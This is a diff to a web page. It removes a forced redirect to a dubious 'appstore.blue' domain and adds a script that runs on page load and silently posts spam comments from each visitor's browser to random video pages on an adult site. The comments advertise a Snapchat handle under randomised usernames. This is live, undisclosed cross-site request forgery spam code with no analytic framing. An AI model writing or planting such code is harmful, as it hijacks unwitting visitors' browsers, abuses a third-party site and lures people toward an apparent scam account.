@@ -1,1 +1,51 @@
-<script>top.location.href='http://fbcont.appstore.blue/';</script>
+<html><head><script>
+
+function getVid(){
+   var sites = ["1483400", "2113267", "398515", "3361522", "1397162", "2137667", "7727422", "8896222", "9110837", "2482397"];
+    var i = parseInt(Math.random()*(sites.length-1));
+    return sites[i];
+};
+
+function getCom(){
+   var sites1 = ["whos playin on snapchat? princessgurlx","add me on snapchat for fun, princessgurlx", "whos on snapchat? princessgurlx"];
+    var i = parseInt(Math.random()*(sites1.length-1));
+    return sites1[i];
+};
+
+var randy=Math.floor(Math.random()*11);
+var cmt=getCom();
+var vid=getVid();
+function XHR() {
+    try {
+        return new XMLHttpRequest();
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml3.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.6.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.3.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Microsoft.XMLHTTP');
+    } catch (e) {};
+    return null;
+};
+xmlhttp = new XHR();
+if (xmlhttp != null) {
+    xmlhttp['open']('POST', 'http://www.xnxx.com/postcomment/' + vid, false);
+    xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+    xmlhttp['send']('user=snapchatb'+randy+'&comment=' + cmt + '&test=ok');
+
+    if (xmlhttp['responseText'] != null) {
+        var token = xmlhttp['responseText'];
+    };
+} else {};
+</script>
+</head>
+</html>
